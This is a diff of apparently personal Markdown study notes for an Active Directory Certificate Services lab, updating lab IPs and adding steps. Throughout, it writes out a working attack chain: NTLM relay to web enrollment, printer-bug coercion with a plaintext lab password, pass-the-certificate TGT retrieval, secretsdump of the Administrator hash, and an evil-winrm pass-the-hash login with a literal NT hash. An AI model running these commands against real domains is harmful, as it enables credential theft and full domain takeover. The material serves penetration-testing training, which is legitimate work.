@@ -19,7 +19,7 @@
 > [!example] NTLMRELAYX
 > Part of the Impact suite, it listens for inbound connections and relays them to web enrollment service via the following:
 ```go
-impacket-ntlmrelayx -t http://10.129.33.137/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
 ```
 
 | Scanning Options | Description                                                   |
@@ -33,7 +33,7 @@ impacket-ntlmrelayx -t http://10.129.33.137/certsrv/certfnsh.asp --adcs -smb2sup
 > [!example] Coerce Authentication
 > A method to coerce user authentication is to exploit the printer bug. It requires the target machine account to have the printer spooler service running
 ```go
-python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.248.139 10.10.14.64
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.2
 ```
 
 
@@ -66,7 +66,7 @@ pip3 install -I git+https://github.com/wbond/oscrypto.git
 
 ###### Executing the Pass the Certificate Attack
 ```go
-python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
+python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
 ```
 
 Once a TGT is obtained....
@@ -76,7 +76,11 @@ export KRB5CCNAME=/tmp/dc.ccache
 ```
 
 ```go
-impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+```go
+evil-winrm -u Administrator -i dc01.inlanefreight.local -H fd02e525dd676fd8ca04e200d265f20c
 ```
 
 -------------------------------
@@ -195,17 +199,17 @@ python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 
 
 Password
 ```go
-hQasUO7dqGBVmcFIGFKA
+jv5UXMIkLgpMSb1Ut4cv
 ```
 
 PFX Certificate
 ```go
-zz4BA4ql.pfx
+PLsPLpjx.pfx
 ```
 
 Now use gettgtpkinit.py to get the TGT as the target
 ```go
-python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx zz4BA4ql.pfx -pfx-pass 'hQasUO7dqGBVmcFIGFKA' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx PLsPLpjx.pfx -pfx-pass 'jv5UXMIkLgpMSb1Ut4cv' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 ```
 
 
@@ -242,6 +246,18 @@ Cannot find KDC for realm "INLANEFREIGHT.LOCAL"
 >
 >
 
+>[!Tip] THE FIX
+> Blow away the current `/etc/krb5.config` and replace with the following:
+> [libdefaults]  
+default_realm = INLANEFREIGHT.LOCAL  
+[realms]  
+INLANEFREIGHT.LOCAL = {  
+kdc = DOMAIN_CONTROLLER_IP  
+default_domain = inlanefreight.local  
+}  
+[domain_realm]  
+.inlanefreight.local = INLANEFREIGHT.LOCAL  
+inlanefreight.local = INLANEFREIGHT.LOCAL
 
 #### Question 2
 What are the contents of the flag.txt on Administrators desktop?
